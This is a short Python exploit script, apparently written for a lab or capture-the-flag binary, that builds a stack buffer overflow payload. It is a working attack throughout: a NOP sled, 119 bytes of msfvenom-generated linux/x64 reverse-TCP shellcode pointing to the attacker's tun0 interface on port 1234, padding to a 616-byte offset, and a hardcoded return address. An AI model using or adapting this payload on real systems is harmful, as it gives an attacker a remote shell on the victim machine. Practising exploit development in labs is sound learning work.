from struct import pack


nop = '\x90' * 300

# msfvenom -p linux/x64/shell_reverse_tcp LHOST=tun0 LPORT=1234 -b "\x00" -f python
# 119 byte

buf =  b""
buf += b"\x48\x31\xc9\x48\x81\xe9\xf6\xff\xff\xff\x48\x8d\x05"
buf += b"\xef\xff\xff\xff\x48\xbb\xe6\xc2\x2d\xf1\xe1\xbe\xac"
buf += b"\x32\x48\x31\x58\x27\x48\x2d\xf8\xff\xff\xff\xe2\xf4"
buf += b"\x8c\xeb\x75\x68\x8b\xbc\xf3\x58\xe7\x9c\x22\xf4\xa9"
buf += b"\x29\xe4\x8b\xe4\xc2\x29\x23\xeb\xb6\xdc\xcf\xb7\x8a"
buf += b"\xa4\x17\x8b\xae\xf6\x58\xcc\x9a\x22\xf4\x8b\xbd\xf2"
buf += b"\x7a\x19\x0c\x47\xd0\xb9\xb1\xa9\x47\x10\xa8\x16\xa9"
buf += b"\x78\xf6\x17\x1d\x84\xab\x43\xde\x92\xd6\xac\x61\xae"
buf += b"\x4b\xca\xa3\xb6\xf6\x25\xd4\xe9\xc7\x2d\xf1\xe1\xbe"
buf += b"\xac\x32"


offset = 616
rip = 0x7fffffffe32c
nop_len = len(nop)
sh_code_len = len(buf)

padding = 'A' * (offset - sh_code_len - nop_len)

# "Q" => unsigned long long => 8 byte and "<" => little endian

payload = nop + buf + padding + pack("<Q", rip)

print(payload)

